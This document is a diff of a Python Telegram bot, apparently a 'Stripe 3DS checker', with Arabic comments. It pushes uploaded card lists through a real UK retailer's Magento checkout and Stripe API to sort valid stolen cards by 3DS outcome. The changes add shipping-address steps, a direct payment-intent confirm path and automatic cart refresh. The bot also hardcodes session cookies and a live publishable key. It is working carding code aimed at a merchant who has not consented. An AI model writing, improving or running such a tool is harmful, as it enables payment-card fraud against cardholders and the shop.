@@ -36,15 +36,12 @@ COOKIES = {
     'store': 'default',
     'geoip_store_code': 'default',
     'searchReport-log': '0',
-    '_gcl_au': '1.1.515112964.1762996300',
     '_ga': 'GA1.1.1544945931.1762996300',
     '_fbp': 'fb.1.1762996300449.745185757966968218',
     'mage-cache-sessid': 'true',
     'currency_code': 'GBP',
     'twk_idm_key': 'PMoLl3NLO_4dYa5TygOUk',
-    'mage-messages': '',
     '__stripe_mid': '5ba8807a-b591-46e1-8779-a46eb868a4f6906666',
-    'sociallogin_referer_store': 'https://www.ironmongeryworld.com/clothes-airers/airer-with-lath/6-lath-victorian-white-ceiling-airer-2-10m.html#',
     'mage-cache-storage': '{}',
     'mage-cache-storage-section-invalidation': '{}',
     'recently_viewed_product': '{}',
@@ -52,13 +49,16 @@ COOKIES = {
     'recently_compared_product': '{}',
     'recently_compared_product_previous': '{}',
     'product_data_storage': '{}',
-    '_ga_PGSR3N5SW9': 'GS2.1.s1763000044$o2$g1$t1763000289$j59$l1$h1845981849',
+    '__stripe_sid': 'a6c30392-8ee2-471e-a366-5dc88ae2ead3f553b6',
+    'mage-messages': '',
+    'sociallogin_referer_store': 'https://www.ironmongeryworld.com/onestepcheckout/',
+    '_ga_PGSR3N5SW9': 'GS2.1.s1763002658$o3$g1$t1763003477$j15$l0$h1810623105',
     '_uetsid': '464c7840becf11f08903dfcb43b5c71c',
     '_uetvid': '464c81c0becf11f08a53418e9d7cada4',
-    'private_content_version': '066a23aaf6946cba78ff34a9a2f66339',
-    'section_data_ids': '{%22cart%22:1763000415%2C%22directory-data%22:1763000343%2C%22gtm%22:1763000415%2C%22wp_confirmation_popup%22:1763000343%2C%22customer%22:1763000314%2C%22compare-products%22:1763000314%2C%22last-ordered-items%22:1763000314%2C%22captcha%22:1763000314%2C%22instant-purchase%22:1763000314%2C%22loggedAsCustomer%22:1763000314%2C%22persistent%22:1763000314%2C%22review%22:1763000314%2C%22wishlist%22:1763000314%2C%22recently_viewed_product%22:1763000314%2C%22recently_compared_product%22:1763000314%2C%22product_data_storage%22:1763000314%2C%22paypal-billing-agreement%22:1763000314}',
-    'twk_uuid_62308ea51ffac05b1d7eb157': '%7B%22uuid%22%3A%221.AGJiGUpszpgFyK1fuLzv7ux73zcIxiPU5UywW1HN5uhgsjjnWh4i9F0OMR4T9BhpDPR4USYpzwLAzPRNrpLIjIpoKvc0t7P14AaYhdeCxg6BfbbW1XjgRdrynUXBNBBP%22%2C%22version%22%3A3%2C%22domain%22%3A%22ironmongeryworld.com%22%2C%22ts%22%3A1763002657174%7D',
-    'TawkConnectionTime': '1763002658245',
+    '_gcl_au': '1.1.515112964.1762996300.449784206.1763003493.1763003492',
+    'TawkConnectionTime': '0',
+    'twk_uuid_62308ea51ffac05b1d7eb157': '%7B%22uuid%22%3A%221.AGJiGUpszpgFyK1fuLzv7ux73zcIxiPU5UywW1HN5uhgsjjnWh4i9F0OMR4T9BhpDPR4USYpzwLAzPRNrpLIjIpoKvc0t7P14AaYhdeCxg6BfbbW1XjgRdrynUXBNBBP%22%2C%22version%22%3A3%2C%22domain%22%3A%22ironmongeryworld.com%22%2C%22ts%22%3A1763003506047%7D',
+    'private_content_version': '73deea543d9f5a275ee336650e0fcd7a',
 }
 
 # ========== دالة لتوليد بريد عشوائي ==========
@@ -188,7 +188,7 @@ stats = {
     'unavailable': 0,
     'declined': 0,
     'errors': 0,
-    'cart_refreshed': 0,  # عدد مرات تحديث السلة
+    'cart_refreshed': 0,
     'start_time': None,
     'is_running': False,
     'dashboard_message_id': None,
@@ -201,7 +201,6 @@ stats = {
     'attempted_cards': [],
 }
 
-# ========== Stripe Checker Class ==========
 # ========== Stripe Checker Class ==========
 class StripeChecker:
     def __init__(self):
@@ -236,10 +235,10 @@ class StripeChecker:
             clean_card = card_number.replace(" ", "").replace("-", "")
             
             data = (
-                f'billing_details[address][state]=NY&'
-                f'billing_details[address][postal_code]=10003&'
-                f'billing_details[address][country]=US&'
-                f'billing_details[address][city]=New+York&'
+                f'billing_details[address][state]=London&'
+                f'billing_details[address][postal_code]=SW1A+1AA&'
+                f'billing_details[address][country]=GB&'
+                f'billing_details[address][city]=London&'
                 f'billing_details[address][line1]=111+North+Street&'
                 f'billing_details[email]={random_email}&'
                 f'billing_details[name]=Card+Test&'
@@ -280,8 +279,8 @@ class StripeChecker:
             pm_id = pm['id']
             logger.info(f"✅ PM Created: {pm_id}")
             
-            # الخطوة 2: إنشاء Payment Intent عبر Magento
-            logger.info(f"📝 Step 2: Creating Payment Intent (Cart: {CART_ID[:15]}...)")
+            # الخطوة 2: إعداد معلومات الشحن أولاً
+            logger.info("📦 Setting shipping information...")
             
             headers = self.headers.copy()
             headers.update({
@@ -291,66 +290,125 @@ class StripeChecker:
                 'x-requested-with': 'XMLHttpRequest',
             })
             
+            # أولاً: نحصل على طرق الشحن المتاحة
+            try:
+                estimate_payload = {
+                    'address': {
+                        'country_id': 'GB',
+                        'postcode': 'SW1A 1AA',
+                        'region': 'London',
+                        'region_id': 0,
+                    }
+                }
+                
+                r_estimate = self.session.post(
+                    f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/estimate-shipping-methods',
+                    headers=headers,
+                    json=estimate_payload,
+                    timeout=25
+                )
+                logger.info(f"📦 Estimate shipping: {r_estimate.status_code}")
+                
+                if r_estimate.status_code == 200:
+                    shipping_methods = r_estimate.json()
+                    if shipping_methods and len(shipping_methods) > 0:
+                        # ابحث عن matrixrate أولاً
+                        method = None
+                        for m in shipping_methods:
+                            if m.get('carrier_code') == 'matrixrate':
+                                method = m
+                                break
+                        
+                        # إذا لم نجد matrixrate، استخدم أول طريقة متاحة
+                        if not method:
+                            method = shipping_methods[0]
+                        
+                        carrier_code = method.get('carrier_code', 'matrixrate')
+                        method_code = method.get('method_code', 'matrixrate_1165')
+                        logger.info(f"📦 Using shipping: {carrier_code}/{method_code}")
+                    else:
+                        carrier_code = 'matrixrate'
+                        method_code = 'matrixrate_1165'
+                else:
+                    carrier_code = 'matrixrate'
+                    method_code = 'matrixrate_1165'
+            except Exception as e:
+                logger.warning(f"⚠️ Estimate error: {e}")
+                carrier_code = 'matrixrate'
+                method_code = 'matrixrate_1165'
+            
+            # ثانياً: نضع معلومات الشحن
+            shipping_payload = {
+                'addressInformation': {
+                    'shipping_address': {
+                        'countryId': 'GB',
+                        'region': 'London',
+                        'street': ['111 North Street'],
+                        'company': '',
+                        'telephone': '3609998856',
+                        'postcode': 'SW1A 1AA',
+                        'city': 'London',
+                        'firstname': 'Card',
+                        'lastname': 'Test',
+                    },
+                    'billing_address': {
+                        'countryId': 'GB',
+                        'region': 'London',
+                        'street': ['111 North Street'],
+                        'company': '',
+                        'telephone': '3609998856',
+                        'postcode': 'SW1A 1AA',
+                        'city': 'London',
+                        'firstname': 'Card',
+                        'lastname': 'Test',
+                        'saveInAddressBook': None,
+                    },
+                    'shipping_method_code': method_code,
+                    'shipping_carrier_code': carrier_code,
+                    'extension_attributes': {},
+                }
+            }
+            
+            try:
+                r_shipping = self.session.post(
+                    f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/shipping-information',
+                    headers=headers,
+                    json=shipping_payload,
+                    timeout=25
+                )
+                logger.info(f"✅ Shipping set: {r_shipping.status_code}")
+                
+                if r_shipping.status_code != 200:
+                    logger.warning(f"⚠️ Shipping failed: {r_shipping.text[:200]}")
+                    
+            except Exception as e:
+                logger.warning(f"⚠️ Shipping method error: {e}")
+            
+            # الخطوة 3: إنشاء Payment Intent عبر Magento
+            logger.info(f"📝 Step 3: Creating Payment Intent (Cart: {CART_ID[:15]}...)")
+            
             payload = {
                 'cartId': CART_ID,
+                'email': random_email,
                 'billingAddress': {
-                    'countryId': 'US',
-                    'region': 'New York',
-                    'regionId': '43',
-                    'regionCode': 'NY',
+                    'countryId': 'GB',
+                    'region': 'London',
                     'street': ['111 North Street'],
                     'company': '',
                     'telephone': '3609998856',
-                    'fax': '',
-                    'postcode': '10003',
-                    'city': 'New York',
+                    'postcode': 'SW1A 1AA',
+                    'city': 'London',
                     'firstname': 'Card',
                     'lastname': 'Test',
-                    'middlename': '',
-                    'prefix': '',
-                    'suffix': '',
-                    'vatId': '',
-                    'customerId': None,
                     'email': random_email,
-                    'sameAsBilling': 0,
-                    'customerAddressId': None,
-                    'saveInAddressBook': 0,
-                    'extension_attributes': {},
-                },
-                'shippingAddress': {
-                    'countryId': 'US',
-                    'region': 'New York',
-                    'regionId': '43',
-                    'regionCode': 'NY',
-                    'street': ['111 North Street'],
-                    'company': '',
-                    'telephone': '3609998856',
-                    'fax': '',
-                    'postcode': '10003',
-                    'city': 'New York',
-                    'firstname': 'Card',
-                    'lastname': 'Test',
-                    'middlename': '',
-                    'prefix': '',
-                    'suffix': '',
-                    'vatId': '',
-                    'customerId': None,
-                    'email': random_email,
-                    'sameAsBilling': 1,
-                    'customerAddressId': None,
-                    'saveInAddressBook': 0,
-                    'extension_attributes': {},
+                    'saveInAddressBook': None,
                 },
                 'paymentMethod': {
                     'method': 'stripe_payments',
                     'additional_data': {
                         'payment_method': pm_id,
                     },
-                    'extension_attributes': {
-                        'agreement_ids': [],
-                    },
                 },
-                'email': random_email,
             }
             
             r = self.session.post(
@@ -371,12 +429,15 @@ class StripeChecker:
                 if any(keyword in error_text.lower() for keyword in ['no such entity', 'not found', 'cart', 'quote']):
                     logger.warning("⚠️ Cart ID expired! Attempting to refresh...")
                     
+                    # محاولة واحدة فقط لتجديد السلة
                     if retry_count == 0:
                         new_cart_id = get_quote_id_smart()
                         
                         if new_cart_id:
                             logger.info(f"✅ تم تحديث Cart ID: {new_cart_id}")
                             stats['cart_refreshed'] += 1
+                            
+                            # إعادة المحاولة مع السلة الجديدة
                             return self.check(card_number, exp_month, exp_year, cvv, retry_count=1)
                         else:
                             logger.error("❌ فشل تحديث السلة")
@@ -385,9 +446,6 @@ class StripeChecker:
                         return 'ERROR', '⚠️ Cart still invalid after refresh'
                 
                 if 'shipping address is missing' in error_text.lower():
-                    logger.error("❌ Shipping address error")
-                    if retry_count == 0:
-                        return self.check(card_number, exp_month, exp_year, cvv, retry_count=1)
                     return 'ERROR', '⚠️ Shipping address error'
                 
                 return 'DECLINED', 'Payment processing failed'
@@ -402,6 +460,7 @@ class StripeChecker:
             logger.info(f"📨 Message: {message[:60]}...")
             
             if 'pi_' not in message:
+                # قد يكون order number
                 if 'order' in message.lower() or message.isdigit():
                     logger.info("✅ Payment succeeded (order created)")
                     return 'Y', f'Payment succeeded - Order: {message}'
@@ -422,7 +481,7 @@ class StripeChecker:
             pi_id = client_secret.split('_secret_')[0]
             logger.info(f"✅ PI Created: {pi_id}")
             
-            # الخطوة 3: الحصول على Payment Intent Details
+            # الخطوة 4: الحصول على Payment Intent Details
             logger.info("📝 Step 3: Fetching Payment Intent")
             
             headers = self.headers.copy()
@@ -463,6 +522,7 @@ class StripeChecker:
                 elif pi_status == 'requires_payment_method':
                     return 'DECLINED', 'Card declined'
                 elif pi_status == 'requires_confirmation':
+                    # نحتاج نعمل confirm
                     logger.info("📝 Confirming payment intent...")
                     
                     data = f'payment_method={pm_id}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X'
@@ -489,7 +549,7 @@ class StripeChecker:
                 else:
                     return 'DECLINED', f'Status: {pi_status}'
             
-            # الخطوة 4: 3DS2 Authentication
+            # الخطوة 5: 3DS2 Authentication
             logger.info("📝 Step 4: 3DS Authentication")
             
             next_action = pi['next_action']
@@ -499,107 +559,179 @@ class StripeChecker:
                 return 'DECLINED', 'No 3DS data'
             
             sdk_data = next_action['use_stripe_sdk']
-            source = sdk_data.get('three_d_secure_2_source', '')
-            trans_id = sdk_data.get('server_transaction_id', '')
             
-            if not source or not trans_id:
-                logger.error("❌ Missing 3DS params")
-                return 'DECLINED', 'Missing 3DS data'
-            
-            logger.info(f"🔐 3DS Source: {source[:30]}...")
-            
-            # إنشاء fingerprint
-            fp_data = {"threeDSServerTransID": trans_id}
-            fp = base64.b64encode(json.dumps(fp_data).encode()).decode()
-            
-            browser_data = {
-                "fingerprintAttempted": True,
-                "fingerprintData": fp,
-                "challengeWindowSize": None,
-                "threeDSCompInd": "Y",
-                "browserJavaEnabled": False,
-                "browserJavascriptEnabled": True,
-                "browserLanguage": "en",
-                "browserColorDepth": "24",
-                "browserScreenHeight": "786",
-                "browserScreenWidth": "1397",
-                "browserTZ": "-120",
-                "browserUserAgent": "Mozilla/5.0"
-            }
-            
-            browser_encoded = urllib.parse.quote(json.dumps(browser_data))
-            
-            data = (
-                f'source={source}&'
-                f'browser={browser_encoded}&'
-                f'one_click_authn_device_support[hosted]=false&'
-                f'one_click_authn_device_support[same_origin_frame]=false&'
-                f'one_click_authn_device_support[spc_eligible]=true&'
-                f'one_click_authn_device_support[webauthn_eligible]=true&'
-                f'one_click_authn_device_support[publickey_credentials_get_allowed]=true&'
-                f'key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&'
-                f'_stripe_version=2020-03-02'
-            )
-            
-            headers = self.headers.copy()
-            headers.update({
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': 'https://js.stripe.com',
-                'referer': 'https://js.stripe.com/',
-            })
-            
-            r = self.session.post(
-                'https://api.stripe.com/v1/3ds2/authenticate',
-                headers=headers,
-                data=data,
-                timeout=25
-            )
-            
-            logger.info(f"✅ 3DS Auth: {r.status_code}")
-            
-            if r.status_code != 200:
-                logger.error(f"❌ 3DS failed: {r.text[:150]}")
-                return 'DECLINED', '3DS auth failed'
-            
-            auth = r.json()
-            
-            # تحليل النتيجة
-            if 'ares' in auth:
-                trans_status = auth['ares'].get('transStatus', 'UNKNOWN')
-                logger.info(f"🎯 3DS Result: {trans_status}")
+            # التحقق من نوع الـ 3DS
+            if 'three_d_secure_2_source' in sdk_data:
+                # 3DS2 Flow
+                source = sdk_data.get('three_d_secure_2_source', '')
+                logger.info(f"🔐 3DS2 Source: {source[:30]}...")
                 
-                status_map = {
-                    'Y': ('Y', '✅ Authenticated - Full verification'),
-                    'C': ('C', '⚠️ Challenge Required'),
-                    'A': ('A', '🔵 Attempted Authentication'),
-                    'N': ('N', '❌ Not Authenticated'),
-                    'U': ('U', '🔴 Unavailable'),
-                    'R': ('DECLINED', '❌ Rejected by issuer'),
+                # إذا كان payment_intent_authentication
+                if source.startswith('payatt_'):
+                    logger.info("🔐 Using Payment Intent Authentication")
+                    
+                    # نستخدم طريقة confirm مباشرة
+                    headers_confirm = self.headers.copy()
+                    headers_confirm.update({
+                        'content-type': 'application/x-www-form-urlencoded',
+                        'origin': 'https://js.stripe.com',
+                        'referer': 'https://js.stripe.com/',
+                    })
+                    
+                    data_confirm = (
+                        f'payment_method={pm_id}&'
+                        f'return_url=https://www.ironmongeryworld.com/stripe/payment/index&'
+                        f'client_secret={client_secret}&'
+                        f'key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X'
+                    )
+                    
+                    r = self.session.post(
+                        f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm',
+                        headers=headers_confirm,
+                        data=data_confirm,
+                        timeout=25
+                    )
+                    
+                    logger.info(f"✅ Confirm PI: {r.status_code}")
+                    
+                    if r.status_code == 200:
+                        confirmed_pi = r.json()
+                        final_status = confirmed_pi.get('status', 'unknown')
+                        logger.info(f"📊 Final Status: {final_status}")
+                        
+                        # تحليل النتيجة النهائية
+                        if final_status == 'succeeded':
+                            return 'Y', '✅ Payment succeeded'
+                        elif final_status == 'requires_action':
+                            # لا يزال يحتاج إجراء - ربما Challenge
+                            return 'C', '⚠️ Challenge Required'
+                        elif final_status == 'requires_payment_method':
+                            return 'DECLINED', '❌ Card declined'
+                        else:
+                            return 'DECLINED', f'Status: {final_status}'
+                    else:
+                        error_text = r.text[:200]
+                        logger.error(f"❌ Confirm failed: {error_text}")
+                        
+                        # محاولة استخراج معلومات مفيدة من الخطأ
+                        try:
+                            error_json = r.json()
+                            if 'error' in error_json:
+                                error_msg = error_json['error'].get('message', 'Unknown error')
+                                # إذا كان الخطأ متعلق بالمصادقة
+                                if 'authenticate' in error_msg.lower() or 'verification' in error_msg.lower():
+                                    return 'A', f'🔵 {error_msg[:50]}'
+                                return 'DECLINED', f'❌ {error_msg[:50]}'
+                        except:
+                            pass
+                        
+                        return 'DECLINED', 'Confirmation failed'
+                
+                # 3DS2 القديمة مع src_
+                trans_id = sdk_data.get('server_transaction_id', '')
+                
+                if not source or not trans_id:
+                    logger.error("❌ Missing 3DS params")
+                    return 'DECLINED', 'Missing 3DS data'
+                
+                logger.info(f"🔐 3DS Source: {source[:30]}...")
+                
+                # إنشاء fingerprint
+                fp_data = {"threeDSServerTransID": trans_id}
+                fp = base64.b64encode(json.dumps(fp_data).encode()).decode()
+                
+                browser_data = {
+                    "fingerprintAttempted": True,
+                    "fingerprintData": fp,
+                    "challengeWindowSize": None,
+                    "threeDSCompInd": "Y",
+                    "browserJavaEnabled": False,
+                    "browserJavascriptEnabled": True,
+                    "browserLanguage": "en",
+                    "browserColorDepth": "24",
+                    "browserScreenHeight": "786",
+                    "browserScreenWidth": "1397",
+                    "browserTZ": "-120",
+                    "browserUserAgent": "Mozilla/5.0"
                 }
                 
-                if trans_status in status_map:
-                    result = status_map[trans_status]
-                    logger.info(f"✅ Final: {result[0]} - {result[1]}")
-                    return result
-                else:
-                    logger.error(f"❌ Unknown status: {trans_status}")
-                    return ('DECLINED', f'Unknown: {trans_status}')
+                browser_encoded = urllib.parse.quote(json.dumps(browser_data))
+                
+                data = (
+                    f'source={source}&'
+                    f'browser={browser_encoded}&'
+                    f'one_click_authn_device_support[hosted]=false&'
+                    f'one_click_authn_device_support[same_origin_frame]=false&'
+                    f'one_click_authn_device_support[spc_eligible]=true&'
+                    f'one_click_authn_device_support[webauthn_eligible]=true&'
+                    f'one_click_authn_device_support[publickey_credentials_get_allowed]=true&'
+                    f'key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&'
+                    f'_stripe_version=2020-03-02'
+                )
+                
+                headers = self.headers.copy()
+                headers.update({
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'origin': 'https://js.stripe.com',
+                    'referer': 'https://js.stripe.com/',
+                })
+                
+                r = self.session.post(
+                    'https://api.stripe.com/v1/3ds2/authenticate',
+                    headers=headers,
+                    data=data,
+                    timeout=25
+                )
+                
+                logger.info(f"✅ 3DS Auth: {r.status_code}")
+                
+                if r.status_code != 200:
+                    logger.error(f"❌ 3DS failed: {r.text[:150]}")
+                    return 'DECLINED', '3DS auth failed'
+                
+                auth = r.json()
+                
+                # تحليل النتيجة
+                if 'ares' in auth:
+                    trans_status = auth['ares'].get('transStatus', 'UNKNOWN')
+                    logger.info(f"🎯 3DS Result: {trans_status}")
+                    
+                    status_map = {
+                        'Y': ('Y', '✅ Authenticated - Full verification'),
+                        'C': ('C', '⚠️ Challenge Required'),
+                        'A': ('A', '🔵 Attempted Authentication'),
+                        'N': ('N', '❌ Not Authenticated'),
+                        'U': ('U', '🔴 Unavailable'),
+                        'R': ('DECLINED', '❌ Rejected by issuer'),
+                    }
+                    
+                    if trans_status in status_map:
+                        result = status_map[trans_status]
+                        logger.info(f"✅ Final: {result[0]} - {result[1]}")
+                        return result
+                    else:
+                        logger.error(f"❌ Unknown status: {trans_status}")
+                        return ('DECLINED', f'Unknown: {trans_status}')
+                
+                if 'error' in auth:
+                    error_msg = auth['error'].get('message', 'Unknown')
+                    logger.error(f"❌ 3DS Error: {error_msg}")
+                    return 'DECLINED', f'Error: {error_msg[:50]}'
+                
+                state = auth.get('state', 'unknown')
+                logger.info(f"📊 State: {state}")
+                
+                if state == 'failed':
+                    return 'DECLINED', 'Authentication failed'
+                elif state == 'succeeded':
+                    return 'Y', 'Authentication succeeded'
+                
+                logger.error(f"❌ Unexpected state: {state}")
+                return 'DECLINED', f'State: {state}'
             
-            if 'error' in auth:
-                error_msg = auth['error'].get('message', 'Unknown')
-                logger.error(f"❌ 3DS Error: {error_msg}")
-                return 'DECLINED', f'Error: {error_msg[:50]}'
-            
-            state = auth.get('state', 'unknown')
-            logger.info(f"📊 State: {state}")
-            
-            if state == 'failed':
-                return 'DECLINED', 'Authentication failed'
-            elif state == 'succeeded':
-                return 'Y', 'Authentication succeeded'
-            
-            logger.error(f"❌ Unexpected state: {state}")
-            return 'DECLINED', f'State: {state}'
+            else:
+                logger.error("❌ No 3DS method found")
+                return 'DECLINED', 'No 3DS available'
             
         except requests.exceptions.Timeout:
             logger.error("⏱️ Request timeout")
@@ -610,6 +742,7 @@ class StripeChecker:
         except Exception as e:
             logger.error(f"💥 Exception: {type(e).__name__}: {str(e)[:100]}")
             return 'ERROR', f'{type(e).__name__}: {str(e)[:50]}'
+
 async def send_result(bot_app, card, status_type, message):
     try:
         card_number = stats['authenticated'] + stats['challenge'] + stats['attempted']
@@ -626,15 +759,15 @@ async def send_result(bot_app, card, status_type, message):
         emoji, title, status_text = status_emojis[status_type]
         
         text = (
-            f"╔══════════════════════╗\n"
+            f"╔═══════════════════╗\n"
             f"{emoji} **{title}** {emoji}\n"
-            f"╚══════════════════════╝\n\n"
+            f"╚═══════════════════╝\n\n"
             f"💳 `{card}`\n"
             f"🔥 Status: **{status_text}**\n"
             f"📊 Card #{card_number}\n"
             f"⚡️ Stripe 3DS Gateway\n"
-            f"📝 {message}\n"
-            f"╚══════════════════════╝"
+            f"📍 {message}\n"
+            f"╚═══════════════════╝"
         )
         
         if status_type == 'Y':
@@ -811,7 +944,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
         return
     
-    keyboard = [[InlineKeyboardButton("📝 إرسال ملف البطاقات", callback_data="send_file")]]
+    keyboard = [[InlineKeyboardButton("📁 إرسال ملف البطاقات", callback_data="send_file")]]
     await update.message.reply_text(
         "📊 **STRIPE 3DS CHECKER BOT**\n"
         "🔄 *With Auto Cart Refresh*\n\n"
@@ -1018,7 +1151,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"🛒 **معلومات السلة الحالية:**\n\n"
             f"📋 Cart ID:\n`{CART_ID}`\n\n"
             f"🔄 عدد مرات التحديث: {stats['cart_refreshed']}\n"
-            f"⚡️ التحديث التلقائي: مفعّل"
+            f"⚡️ التحديث التلقائي: مُفعّل"
         )
         await query.answer(cart_info_text, show_alert=True)
 
